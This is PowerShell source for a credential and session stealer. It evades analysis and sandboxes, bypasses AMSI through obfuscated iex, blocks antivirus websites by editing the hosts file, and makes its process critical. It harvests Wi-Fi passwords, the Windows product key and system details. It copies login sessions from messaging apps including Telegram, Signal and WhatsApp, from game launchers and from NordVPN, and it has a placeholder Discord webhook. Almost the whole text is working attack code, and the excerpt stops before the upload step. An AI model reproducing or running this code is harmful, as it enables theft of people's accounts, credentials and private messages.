$debug = $false

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}


function KDMUTEX {
    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if ( -not $CreatedNew ) {
        throw "An instance of this script is already running."
    }
    else {
        VMBYPASSER
    }
}

Add-Type -AssemblyName PresentationCore, PresentationFramework

$webhook = "YOUR_WEBHOOK_HERE"
$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@

# Request admin with AMSI bypass
function INVOKE-AC {
    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kdotcheck
}

function Hide-Console {
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
            [DllImport("Kernel32.dll")]
            public static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]
            public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
            '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

function make_error_page {
    param(
        [Parameter(Mandatory = $true)]
        [string]$error_message
    )
    $null = [System.Windows.MessageBox]::Show("$error_message", "ERROR", 0, 16)
}

function Search-Mac ($mac_addresses) {
    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
    ForEach ($mac123 in $mac_addresses) {
        if ($pc_mac -contains $mac123) {
            return $true
        }
    }
    return $false
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    ForEach ($ip123 in $ip_addresses) {
        if ($pc_ip -contains $ip123) {
            return $true
        }
    }
    return $false
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    ForEach ($hwid123 in $hwids) {
        if ($pc_hwid -contains $hwid123) {
            return $true
        }
    }
    return $false
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    ForEach ($username123 in $usernames) {
        if ($pc_username -contains $username123) {
            return $true
        }
    }
    return $false
}

function ram_check {
    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { [Math]::Round(($_.Sum / 1GB), 2) }
    if ($ram -lt 4) {
        make_error_page "RAM CHECK FAILED"
        Start-Sleep -s 3
        exit
    }
}

function VMBYPASSER {
    ram_check
    $processnames = @(
        "autoruns",
        "die",
        "dumpcap",
        "dumpcap",
        "fakenet",
        "fiddler",
        "filemon",
        "hookexplorer",
        "httpdebugger",
        "immunitydebugger",
        "importrec",
        "joeboxcontrol",
        "joeboxserver",
        "lordpe",
        "ollydbg",
        "petools",
        "proc_analyzer",
        "processhacker",
        "procexp",
        "procmon",
        "qemu-ga",
        "qga",
        "resourcehacker",
        "sandman",
        "scylla_x64",
        "sysanalyzer",
        "sysinspector",
        "sysmon",
        "tcpview",
        "tcpview64",
        "tcpdump",
        "vboxservice",
        "vboxtray",
        "vboxcontrol",
        "vmacthlp",
        "vmwareuser",
        "windbg",
        "wireshark",
        "x32dbg",
        "x64dbg",
        "xenservice"
    )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName -Erroraction SilentlyContinue) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-ANTITOTAL
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Exit 1
    }
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                make_error_page "Detected VM"
                Start-Sleep -s 3
                exit
            }
        }
        else {
            ""
        }
    }
    [ProcessUtility]::MakeProcessCritical()
    Invoke-TASKS
}

function HOSTS-BLOCKER {
    $KDOT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
    if ($KDOT -ne $null) {}else {
        Add-Content c:\Windows\System32\Drivers\etc\hosts "`n#GODFATHER `n0.0.0.0 www.malwarebytes.com`n0.0.0.0 malwarebytes.com`n0.0.0.0 143.204.176.32`n0.0.0.0 www.antivirussoftwareguide.com`n0.0.0.0 antivirussoftwareguide.com`n0.0.0.0 68.183.21.156`n0.0.0.0 www.norton.com`n0.0.0.0 norton.com`n0.0.0.0 23.99.92.83`n0.0.0.0 www.avg.com`n0.0.0.0 avg.com`n0.0.0.0 69.94.64.29`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.uk.pcmag.com`n0.0.0.0 uk.pcmag.com`n0.0.0.0 104.17.101.99`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.mcafee.com`n0.0.0.0 mcafee.com`n0.0.0.0 161.69.29.243`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.go.crowdstrike.com`n0.0.0.0 go.crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.virustotal.com`n0.0.0.0 virustotal.com`n0.0.0.0 216.239.32.21`n0.0.0.0 www.acronis.com`n0.0.0.0 acronis.com`n0.0.0.0 34.120.97.237`n0.0.0.0 www.adaware.com`n0.0.0.0 adaware.com`n0.0.0.0 104.16.236.79`n0.0.0.0 www.ahnlab.com`n0.0.0.0 ahnlab.com`n0.0.0.0 211.233.80.53`n0.0.0.0 www.antiy.net`n0.0.0.0 antiy.net`n0.0.0.0 47.91.137.195`n0.0.0.0 www.symantec.com`n0.0.0.0 symantec.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.broadcom.com`n0.0.0.0 broadcom.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.superantispyware.com`n0.0.0.0 superantispyware.com`n0.0.0.0 44.231.57.118`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.sangfor.com`n0.0.0.0 sangfor.com`n0.0.0.0 151.101.2.133`n0.0.0.0 www.rising-global.com`n0.0.0.0 rising-global.com`n0.0.0.0 219.238.233.230`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.wearethinc.com`n0.0.0.0 wearethinc.com`n0.0.0.0 217.199.161.10`n0.0.0.0 www.cybernews.com`n0.0.0.0 cybernews.com`n0.0.0.0 172.66.43.197`n0.0.0.0 www.quickheal.com`n0.0.0.0 quickheal.com`n0.0.0.0 103.228.50.23`n0.0.0.0 www.pandasecurity.com`n0.0.0.0 pandasecurity.com`n0.0.0.0 91.216.218.44`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.guard.io`n0.0.0.0 guard.io`n0.0.0.0 34.102.139.130`n0.0.0.0 www.maxpcsecure.com`n0.0.0.0 maxpcsecure.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.maxsecureantivirus.com`n0.0.0.0 maxsecureantivirus.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.akamai.com`n0.0.0.0 akamai.com`n0.0.0.0 104.82.181.162`n0.0.0.0 www.lionic.com`n0.0.0.0 lionic.com`n0.0.0.0 220.130.53.233`n0.0.0.0 www.ccm.net`n0.0.0.0 ccm.net`n0.0.0.0 23.55.12.105`n0.0.0.0 www.kaspersky.co.uk`n0.0.0.0 kaspersky.co.uk`n0.0.0.0 185.85.15.26`n0.0.0.0 www.crowdstrike.com`n0.0.0.0 crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.k7computing.com`n0.0.0.0 k7computing.com`n0.0.0.0 52.172.54.225`n0.0.0.0 www.softonic.com`n0.0.0.0 softonic.com`n0.0.0.0 35.227.233.104`n0.0.0.0 www.ikarussecurity.com`n0.0.0.0 ikarussecurity.com`n0.0.0.0 91.212.136.200`n0.0.0.0 www.gridinsoft.com`n0.0.0.0 gridinsoft.com`n0.0.0.0 104.26.9.187`n0.0.0.0 www.simspace.com`n0.0.0.0 simspace.com`n0.0.0.0 104.21.82.22`n0.0.0.0 www.osirium.com`n0.0.0.0 osirium.com`n0.0.0.0 35.197.237.129`n0.0.0.0 www.gdatasoftware.co.uk`n0.0.0.0 gdatasoftware.co.uk`n0.0.0.0 212.23.151.164`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.basicsprotection.com`n0.0.0.0 basicsprotection.com`n0.0.0.0 3.111.153.145`n0.0.0.0 www.fortinet.com`n0.0.0.0 fortinet.com`n0.0.0.0 3.1.92.70`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.escanav.com`n0.0.0.0 escanav.com`n0.0.0.0 67.222.129.224`n0.0.0.0 www.emsisoft.com`n0.0.0.0 emsisoft.com`n0.0.0.0 104.20.206.62`n0.0.0.0 www.drweb.com`n0.0.0.0 drweb.com`n0.0.0.0 178.248.233.94`n0.0.0.0 www.cyren.com`n0.0.0.0 cyren.com`n0.0.0.0 216.163.188.84`n0.0.0.0 www.cynet.com`n0.0.0.0 cynet.com`n0.0.0.0 172.67.38.94`n0.0.0.0 www.comodosslstore.com`n0.0.0.0 comodosslstore.com`n0.0.0.0 172.67.28.161`n0.0.0.0 www.clamav.net`n0.0.0.0 clamav.net`n0.0.0.0 198.148.79.54`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.totalav.com`n0.0.0.0 totalav.com`n0.0.0.0 34.117.198.220`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.baidu.com`n0.0.0.0 baidu.com`n0.0.0.0 39.156.66.10`n0.0.0.0 www.avira.com`n0.0.0.0 avira.com`n0.0.0.0 52.58.28.12`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.arcabit.pl`n0.0.0.0 arcabit.pl`n0.0.0.0 188.166.107.22`n0.0.0.0 www.surfshark.com`n0.0.0.0 surfshark.com`n0.0.0.0 104.18.120.34`n0.0.0.0 www.nordvpn.com`n0.0.0.0 nordvpn.com`n0.0.0.0 104.17.49.74`n0.0.0.0 support.microsoft.com`n0.0.0.0 www.support.microsoft.com`n"
    }
    $Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge")
    $terminatedProcesses = @()
    foreach ($browser in $Browsers) {
        $process = Get-Process -Name $browser -ErrorAction 'SilentlyContinue'
        if ($process -ne $null) {
            Stop-Process -Name $browser -ErrorAction 'SilentlyContinue' -Force
            $terminatedProcesses += $browser
        }
    }
}


function Request-Admin {
    while (!(INVOKE-AC)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Backup-Data {
    $folder_general = "$env:APPDATA\KDOT\DATA"
    $folder_messaging = "$env:APPDATA\KDOT\DATA\Messaging Sessions"
    $folder_gaming = "$env:APPDATA\KDOT\DATA\Gaming Sessions"
    $folder_crypto = "$env:APPDATA\KDOT\DATA\Crypto Wallets"
    $folder_vpn = "$env:APPDATA\KDOT\DATA\VPN Clients"
    $folder_email = "$env:APPDATA\KDOT\DATA\Email Clients"
    $important_files = "$env:APPDATA\KDOT\DATA\Important Files"
    $browser_data = "$env:APPDATA\KDOT\DATA\Browser Data"

    New-Item -ItemType Directory -Path $folder_general -Force
    New-Item -ItemType Directory -Path $folder_messaging -Force
    New-Item -ItemType Directory -Path $folder_gaming -Force
    New-Item -ItemType Directory -Path $folder_crypto -Force
    New-Item -ItemType Directory -Path $folder_vpn -Force
    New-Item -ItemType Directory -Path $browser_data -Force
    New-Item -ItemType Directory -Path $folder_email -Force
    New-Item -ItemType Directory -Path $important_files -Force

    #bulk data
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $folder_general\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $folder_general\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $folder_general\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $folder_general\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $folder_general\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N2}" -f ([math]::round(($_.Sum / 1GB), 2)) }
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -Expand macaddress) -join ","
    $mac > $folder_general\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    netstat -ano > $folder_general\netstat.txt
    $mfg = (Get-WmiObject win32_computersystem).Manufacturer
    #end of bulk data
	
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | Format-Table | out-string


    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | % { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | % { (netsh wlan show profile name="$name" key=clear) } | Select-String "Key Content\W+\:(.+)$" | % { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $pass } } | Format-Table -AutoSize 
    $wifi = $wifipasslist | out-string 
    $wifi > $folder_general\WIFIPasswords.txt

    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"

    #misc data
    Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $folder_general\StartUpApps.txt
    Get-WmiObject win32_service | Where-Object State -match "running" | Select-Object Name, DisplayName, PathName, User | Sort-Object Name | Format-Table -wrap -autosize >  $folder_general\running-services.txt
    Get-WmiObject win32_process | Select-Object Name, Description, ProcessId, ThreadCount, Handles, Path | Format-Table -wrap -autosize > $folder_general\running-applications.txt
    Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $folder_general\Installed-Applications.txt
    Get-NetAdapter | Format-Table Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium -AutoSize > $folder_general\NetworkAdapters.txt


    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace / $SizeOfDisk) * 100
                [int]$usedpercent = ($usedspace / $SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive             = $disk.Name
                    Name              = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results 
    }
    $alldiskinfo = diskdata | out-string 
    $alldiskinfo > $folder_general\diskinfo.txt


    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    # All Messaging Sessions
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        if (!(Test-Path $pathtele)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $destination = "$folder_messaging\Telegram.zip"
        $exclude = @("_*.config", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
        $files = Get-ChildItem -Path $pathtele -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
    }


    # Element Session Stealer
    function elementstealer {
        $processname = "element"
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force 
    }


    # ICQ Session Stealer
    function icqstealer {
        $processname = "icq"
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session 
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
    }


    # Signal Session Stealer
    function signalstealer {
        $processname = "signal"
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    }


    # Viber Session Stealer
    function viberstealer {
        $processname = "viber"
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session
        $configfiles = @("config$1")
        foreach ($file in $configfiles) {
            Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $viber_session }
        }
        $pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
        }
        $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
        foreach ($file in $files) {
            $parentFolder = Split-Path -Path $file.FullName -Parent
            $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern }
            if (-not $phoneNumberFolder) {
                Copy-Item -Path $file.FullName -Destination $destinationPath
            }
        }
    }


    # Whatsapp Session Stealer
    function whatsappstealer {
        $processname = "whatsapp"
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session
        $regexPattern = "WhatsAppDesktop"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
            $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            if ($localStateFolder) {
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
            }
        }
    }

    # All Gaming Sessions
    # Steam Session Stealer
    function steamstealer {
        $processname = "steam"
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }


    # Minecraft Session Stealer
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        if (!(Test-Path $minecraft_session)) { return }
        New-Item -ItemType Directory -Force -Path $minecraft_session
        $minecraftfolder1 = $env:appdata + "\.minecraft"
        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session 
    }

    # Epicgames Session Stealer
    function epicgames_stealer {
        $processname = "epicgameslauncher"
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }

    # Ubisoft Session Stealer
    function ubisoftstealer {
        $processname = "upc"
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue'-ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }

    # EA Session Stealer
    function electronic_arts {
        $processname = "eadesktop"
        $eafolder = "$env:localappdata\Electronic Arts"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        if (!(Test-Path $ea_session)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        New-Item -ItemType Directory -Force -Path $ea_session
        Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
    }

    # Growtopia Stealer
    function growtopiastealer {
        $processname = "growtopia"
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        New-Item -ItemType Directory -Force -Path $growtopia_session
        Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
    }


    # All VPN Sessions

    # NordVPN 
    function nordvpnstealer {
        $processname = "nordvpn"
        $nordvpnfolder = "$env:localappdata\nordvpn"
        if (!(Test-Path $nordvpnfolder)) { return }
        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
        $nordvpn_account = "$folder_vpn\NordVPN"
        New-Item -ItemType Directory -Force -Path $nordvpn_account
        $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
        Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
    }
    
	
